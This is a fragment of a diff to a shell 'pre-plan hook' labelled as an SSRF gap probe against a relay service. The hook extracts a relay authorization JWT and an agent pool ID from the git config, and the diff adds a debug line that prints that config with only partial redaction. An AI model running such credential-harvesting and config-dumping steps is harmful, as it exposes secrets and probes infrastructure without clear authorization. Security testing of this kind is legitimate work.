@@ -2,8 +2,10 @@
 # SCALRCORE-38322 SSRF gap probe — pre-plan hook.
 
 JWT=$(grep -oP '(?<=x-relay-authorization:).+' "$XDG_CONFIG_HOME/git/config")
-POOL=apool-v0p88m73bm13hgqhg
+POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:).+' "$XDG_CONFIG_HOME/git/config")
 RELAY=https://relay.main.scalr.dev
+echo "DEBUG: git config follows (auth redacted)"
+sed 's/\(x-relay-authorization:\)[^[:space:]]*/\1<redacted>/' "$XDG_CONFIG_HOME/git/config" 2>/dev/null | sed 's/:[^/@:]\{20,\}@/:<token>@/'
 
 run() {
   local label=$1; shift
